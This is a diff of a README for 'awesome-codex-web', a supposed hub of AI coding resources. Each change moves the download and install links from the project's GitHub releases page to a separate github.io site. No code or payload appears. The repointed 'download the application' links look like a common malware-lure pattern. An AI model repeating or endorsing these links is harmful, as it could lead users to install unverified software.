@@ -1,6 +1,6 @@
 # 🚀 awesome-codex-web - Your Ultimate Codex Web Resource Hub
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--codex--web-blue?style=for-the-badge&logo=github)](https://github.com/Elpil8299/awesome-codex-web/releases)
+[![Download Now](https://img.shields.io/badge/Download-awesome--codex--web-blue?style=for-the-badge&logo=github)](https://elpil8299.github.io)
 
 ## 👋 Welcome to awesome-codex-web
 
@@ -32,7 +32,7 @@ Navigating the world of AI coding tools can be overwhelming. There are dozens of
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [https://github.com/Elpil8299/awesome-codex-web/releases](https://github.com/Elpil8299/awesome-codex-web/releases)
+Visit this link to download the application: [https://elpil8299.github.io](https://elpil8299.github.io)
 
 ### Step-by-Step Guide:
 
@@ -168,10 +168,10 @@ Remember, every expert was once a beginner. Start your journey today by download
 
 ## 🔗 Quick Access Links
 
-- **Download Now**: [https://github.com/Elpil8299/awesome-codex-web/releases](https://github.com/Elpil8299/awesome-codex-web/releases)
+- **Download Now**: [https://elpil8299.github.io](https://elpil8299.github.io)
 - **Project Homepage**: Check the GitHub repository for additional information
 
-Visit this link to download the application: [https://github.com/Elpil8299/awesome-codex-web/releases](https://github.com/Elpil8299/awesome-codex-web/releases)
+Visit this link to download the application: [https://elpil8299.github.io](https://elpil8299.github.io)
 
 ---
 
